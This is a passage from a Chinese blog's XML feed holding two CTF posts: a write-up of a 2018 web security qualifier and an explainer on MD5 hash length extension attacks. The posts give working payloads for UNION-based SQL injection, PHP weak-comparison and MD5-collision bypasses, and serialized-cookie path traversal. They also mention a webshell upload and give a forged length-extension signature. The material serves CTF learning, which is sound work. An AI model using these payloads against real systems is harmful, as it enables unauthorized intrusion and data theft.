    <content type="text"><![CDATA[题记：学校组织参加这个比赛，对于没有信安专业的学院来说，参赛重点就是嵌入式与开发者，留下我们自生自灭，在此记录一下，刷下一存在感吧，虽然没拿到理想结果，毕竟来过233333。错误的地方，欢迎大佬们指正。 2018WEB安全测试秋季预选赛 0x01 input传送门：http://114.55.36.69:8003/题目上说前三道题目是容易的，于是就从容易的题目入手，为了拿到1血，手速飞快地点，emmm，一紧张忘了js输出语句怎么写了，百度后才发现，自己有多蠢alert啊！ 进入网址，发现一个输入框，查看源码，发现id=”flag”，后面有一段js代码 123456789101112&lt;script&gt; function check()&#123; var flag = document.getElementById(&quot;flag&quot;).value; var str = &quot;d84d9657e5e5e&quot; || 0; var str = str + (&quot;ad2ad3fe&quot; &amp;&amp; 2); var str = str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;; var str = str.split(&quot;&quot;).reverse().join(&quot;&quot;); if (str == flag)&#123; alert(&quot;恭喜你已经找到flag！&quot;); &#125; &#125;&lt;/script&gt; 二话不说，直接console下执行，emmmm，可惜一下。提交即可 0x02 MD5传送门：http://114.55.36.69:8004/ 打开后发现一段文字：easy MD5 cracking fail。应该与MD5有关，简单的就是弱类型，再不就是MD5碰撞，查看源码，发现是考察PHP弱类型 1easy MD5 cracking &lt;!--$_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;]--&gt;fail 脑补一下剩下的代码 123if(($_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;])&amp;&amp;(md5($_POST[&apos;data1&apos;])==md5($_POST[&apos;data2&apos;])) echo $flag; 于是post传参：data1=QNKCDZO&amp;data2=240610708，得到答案 0x03 参数提交传送门：http://114.55.36.69:8012/ flag作为参数，post方式提交，提示必须大于10位，提交flag=11111111111，即可得到flag。-.- 0x04 新闻查询传送门：http://114.55.36.69:8010/ 先上图有关键词，有条数，初步猜测是注入，关键词输入1’发现查看源码，发现前端过滤 1234567891011121314151617function myFunction() &#123; var x=document.getElementById(&quot;number&quot;).value; var a=document.getElementById(&quot;word&quot;).value; var b=a.replace(/[\ |\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\||\\|\[|\]|\&#123;|\&#125;|\;|\:|\&quot;|\&apos;|\,|\&lt;|\.|\&gt;|\/|\?|\·|\！|\（|\）|\￥|\——|\……|\【|\】|\、|\；|\：|\‘|\“|\”|\’|\，|\。|\、|\《|\》|\？|\ ]/g,&quot;&quot;); if(a.length!=b.length) &#123; alert(&quot;请输入正确字符。&quot;); document.getElementById(&quot;number&quot;).value = &apos;&apos;; document.getElementById(&quot;word&quot;).value = &apos;&apos;; &#125; else if(isNaN(x)) &#123; alert(&quot;请输入数字。&quot;); document.getElementById(&quot;number&quot;).value = &apos;&apos;; &#125; &#125; 于是手动禁掉js代码，并且猜测后端代码是关键词处查询处存在sql注入一直尝试，却没有任何回显，听说可以sqlmap直接跑，于是sqlmap启动！保存请求包，sqlmap -r payload.txt –dump当时时间也是关键，能出flag就可以，写这个时候，才手动注入，像这种的关键词查询，一般都是使用like%%的模糊查询,所以需要闭合%，构造payload：1%’ AND 1=1 AND ‘%’=’成功注入这里对like%%进行一些了解首先我们在本地数据库中输入12345678910111213141516mysql&gt; select * from tests where password like &apos;%a%&apos;;+---------+----------+| usename | password |+---------+----------+| admin | password || admin | admin |+---------+----------+2 rows in set (0.00 sec)mysql&gt; select * from tests where password like &apos;%as%&apos;;+---------+----------+| usename | password |+---------+----------+| admin | password |+---------+----------+1 row in set (0.00 sec) 可以发现like%$value%相当于/.*$value.*/，如果注入的话，我们需要闭合前面的%’,而且还有闭合后面的%’红框里面的内容为外部输入。了解完like%%的注入，接着看题目123456789# 得到列payload: 1%&apos; order by 3-- 返回正常payload: 1%&apos; order by 4--返回异常得知表有为3列# 找回显点payload: 1%&apos; union select 1,2,3-- 在页面下面出现1,2，3 12# 注入表，列，字段，此处省略过程payload: 1%&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()),flag from admin-- 成功拿到flag 0x05 MD5碰撞传送门：http://114.55.36.69:8006/ 又是一个关于MD5的题目，而且提示依然为：MD5 crackingfail。这样从分值与顺序看起来，不出意外就是MD5碰撞，查看源码发现1if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;])) 这里两边都是强判断===，并且强制转换为string类型进行比较，听表哥说，只能通过md5碰撞绕过去先了解一下什么是md5碰撞12## md5碰撞从根本上讲，MD5算法是一种摘要算法，它可以从多个字节组成的串中计算出由32个字节构成的“特征串”。对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在两个（或更多）不同的串能够得出相同MD5值的情况。这种情况就叫做MD5碰撞。 我们需要找到两个字符串不一样，但是MD5值一模一样的字符串，用MD5碰撞生成器生成 12345678910&gt; fastcoll_v1.0.0.5.exe -o data1.txt data2.txtMD5 collision generator v1.5by Marc Stevens (http://www.win.tue.nl/hashclash/)Using output filenames: &apos;data1.txt&apos; and &apos;data2.txt&apos;Using initial value: 0123456789abcdeffedcba9876543210Generating first block: .............Generating second block: S01.....Running time: 8.187 s 然后对data1.txt与data2.txt中的内容进行url编码后，curl发请求，或者在该网址中找，即可得到flag123456789101112131415161718192021222324root@Kali:~# curl -v http://114.55.36.69:8006/ -H &quot;Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&quot; --data &quot;data1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;data2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;* Hostname was NOT found in DNS cache* Trying 114.55.36.69...* Connected to 114.55.36.69 (114.55.36.69) port 8006 (#0)&gt; POST / HTTP/1.1&gt; User-Agent: curl/7.38.0&gt; Host: 114.55.36.69:8006&gt; Accept: */*&gt; Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&gt; Content-Length: 315&gt; Content-Type: application/x-www-form-urlencoded&gt; * upload completely sent off: 315 out of 315 bytes&lt; HTTP/1.1 200 OK&lt; Date: Sun, 28 Oct 2018 16:57:05 GMT* Server Apache/2.2.15 (CentOS) is not blacklisted&lt; Server: Apache/2.2.15 (CentOS)&lt; X-Powered-By: PHP/5.3.3&lt; Content-Length: 156&lt; Connection: close&lt; Content-Type: text/html; charset=UTF-8&lt; * Closing connection 0MD5 cracking&lt;!-- if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;]))--&gt;flag&#123;9bd1ee7355b58e53214adb9a37b4cb82&#125; 在这备份几条 12345678# firstM%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2# second4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea24dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2MD5 hash:008ee33a9d58b51cfeb425b0959121c9 0x06 Game传送门：http://114.55.36.69:8011/ 进入界面是一款贪吃蛇游戏，果断看js代码逻辑F12查看源码外面是外部的js脚本，在Source中查看发现于是猜测这一段颜文字应该会有与flag相关的信息，于是console执行一下显然flag是错误的，点击view继续跟进参看12345(function anonymous() &#123;window[&apos;flag&apos;] = &apos;Flag&#123;660332922504a5f06dd871a7fe78ba9c&#125;&apos;;console.log(&quot;Flag&#123; hahahah wrong!! :(&#125;&quot;);&#125;) 得到flag 0x07 Notepad传送门：http://114.55.36.69:8014/index.php/ 功能齐全，直接注册帐号，进入upload修改type（只能传jpg）上传一张图片,然后在picture内查看到发现图片中有一串base64，在bp中查看发现这一串base很长，在请求包的cookie中发现picture值解码发现为php序列化，而且保存的上传文件的文件名猜测picture的值提交后，然后页面在img标签下会回显文件内容的base64。于是显示index.php页面，手动构造序列化，在这里我们先了解一下序列化的组成12345678910例子：a:2:&#123;i:0;s:5:&quot;1.jpg&quot;;i:1;s:5:&quot;1.php&quot;;&#125;a的意思就是数组array2说明数组里面有两对值分别为1.jpg与1.phpi作为下标s代表为string类型5表示长度即0=&gt;1.jpg1=&gt;1.php 所以我们可以构造为：a:1:{i:0;s:9:”index.php”;}，base64后为YToxOntpOjA7czo5OiJpbmRleC5waHAiO30=，bp重放查看回显做到这，有两个思路，一个是上传一句话然后getshell，因为路径是爆出来了，仅仅是type限制；第二个是直接才flag在哪，读出来。两种方法都很简单，不做细说，第一种改type为image/jpg后，访问http://114.55.36.69:8014/upload/x.php，然后传入命令find / -name flag*。第二种是测试发现，flag在../../flag.php下，然后构造a:1:{i:0;s:14:”../../flag.php”;}=&gt;YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=，请求1234567891011121314151617# requestGET /index.php/picture HTTP/1.1Host: 114.55.36.69:8014Proxy-Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://114.55.36.69:8014/index.php/pictureAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=; PHPSESSID=1vm2g30rlcqosqsj9ici1rdku1; session=eyJsb2dpbiI6dHJ1ZSwidXNlcm5hbWUiOiJYWEgifQ.DreFfA.iwKT84kXV5efjz90397IoKUYiik# response(part)&lt;img src=&quot;data:image/jpg;base64,PD9waHAKCiRmbGFnID0gImZsYWd7TjRtZV9zUGFjNF9Jc19JbnQzcjNzdDFuZ30iOwplY2hvICJmbGFne1RoaXNfMVNfQV9GNGtlX2YxYUd9IjsK&quot;&gt;# base64解密&lt;?php$flag = &quot;flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;&quot;;echo &quot;flag&#123;This_1S_A_F4ke_f1aG&#125;&quot;; 得到flag 后记 emmmm，实力有限，只能做出这么几道，至于排名感觉进不去下一场比赛啊。对于萌新的我，做这几道题目，费劲了一下午，晚上感谢小可爱的陪伴，有你真幸福。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hash长度扩展攻击]]></title>
    <url>%2F2018%2F05%2F10%2F1%2F</url>
    <content type="text"><![CDATA[ISCC时间线好长，课业繁忙，江湖再见，告辞！ 五一假期在干嘛？相信有很多小伙伴（其实是大表哥）开始了ISCC之旅，不知道为了在这个“动态分数”机制环境下得到更多的分数，大家的肝还好不好呢？ 信息安全与对抗技术竞赛（ISCC：Information Security and Countermeasures Contest），于2004年首次举办，是教育部、工业和信息化部主办的第一个国家级信息安全技术竞赛，在做题的时候，有一道题很有趣，web250的hash长度拓展攻击，这个方法原理不难，在几年前已经出现了，在2009年，Thai Duong 与 Juliano Rizzo发布了ASP.NET的padding oracle攻击，同时还写了一篇关于Flickr API签名可伪造的paper，Flickr API签名这个漏洞，实际上用的是MD5 Length Extension Attack，钻研了一个多星期的各位大表哥写的文章以及hash加密的具体算法，我想谈谈自己理解，并且分享一份自己写的利用代码。 0x01 原理 首先先看一张图片这有一幅图，感觉能把核心思路与过程充分地体现出来，不过在此之前我们应该了解MD5加密的大体步骤：填充与使用上一次计算出来的幻值进行四轮运算。 我们输入一个需要加密的字符的时候，该算法会对字符串进行分组，每448位（bit）也就是56字节一组，当不足448位时需要进行补充，我们先说一下448位的来源。每一个进行四轮运算的字符串，长度为64字节也就是512位，其中有8个字节是记录信息的长度（长度的意思是信息是多少二进制位），那么容纳信息的就只要56字节。假设我们对一个10个字节（80bit）的字符串A进行填充至64字节第一步，需要查看该信息是否小于等于56字节，即length(A)%64&lt;=56?这里单位是以字节为单位。第二步，对不足56字节的字符串进行填充，那么对A来说需要填充46字节，规定第一个字节必须填充%80，其余的填充%00，那么A填充的内容为：1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00 这里面有45个%00填充完毕。随后我们需要填充摘要信息，也是信息的长度，A有10字节，也就是80bit，换算成16进制为0x50，那么后面需要填充的8个字节为：1%50%00%00%00%00%00%00%00 为什么不是%00%00%00%00%00%00%00%50呢？因为MD5是小端存储，也就是低地址存储高位字节。对于小端储存，比如0x1234=&gt;34120000(假设32位储存长度)。至此我们需要处理的64位数据已经构造成功，这时候需要上一次MD5运算得到的ABCD来作为本次MD5运算的初始序列ABCD。在这里我们解释一下初始序列，对于第一次运算来说会默认四个32位初始序列1234A=0x01234567B=0x89abcdefC=0xfedcba98D=0x7654321 它们被称为链接变量将上面四个变量分别赋值到a,b,c,d变量中然后进行主循环(四轮)，每一轮都很相似。第一轮进行16次操作。每次操作对a，b，c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向右环移一个不定的数，并加上a，b，c或d中之一。最后用该结果取代a，b，c或d中之一。这样新的链接变量诞生了，如果还需要进行加密，那么就作为下一次加密的初始序列，如果结束的话，那么就把a,b,c,d进行大端储存，并且在一块。 0x02 一道CTF题目 理论说完了，我们来看一下题目： 题目直接给了源代码，审计的题目比较好做走我们我们可以知道，如果enc($username) === $_COOKIE[‘verify’]那么就setcookie的verifty:为md5($key+’guest’)可以知道未知的secret是$key，但是我们从下一套语句可以知道，$key的length：setcookie(“len”, strlen($key), time()+606024*7);因此这个题目已经分析出来了 已知的是：123$key的lengthmd5($key+&apos;guest&apos;)$username里要有admin字串 那么第一步上bp抓包找一下需要的数据可以发现 verify=78cfc57d983b4a17e55828c001a3e781 len=46使用hashpump我们把12payload:guest%80%00%00%00%00%98%01%00%00%00%00%00%00adminverify：5f585093a7fe86971766c3d25c43d0eb 进行repeater成功拿到flag 0x03 扩展 对于hash长度拓展攻击，挺感兴趣的，之后看了很多资料，凭着自己的理解写了一个脚本，虽然写出来了，对md5加密的算法理解了，但是不知道这四轮参与运算的固定的16进制为什么是这几个，还是应该好好研究。对于这个的用法，我简单的说一下1python expliot.py 作为初始序列的md5值 最为第二轮md5运算的字符 上一次的md5运算前的padding的时候%80前面字符串的二进制位数 脚本我放在我的github里 0x04 后记 之前一直在他大神们托管在github里的项目，这是第一次使用github因为是在学习的时候写的这个利用脚本，注释挺多的。 推荐一篇很棒的文章 https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>hash长度扩展攻击</tag>
      </tags>
  </entry>
</search>
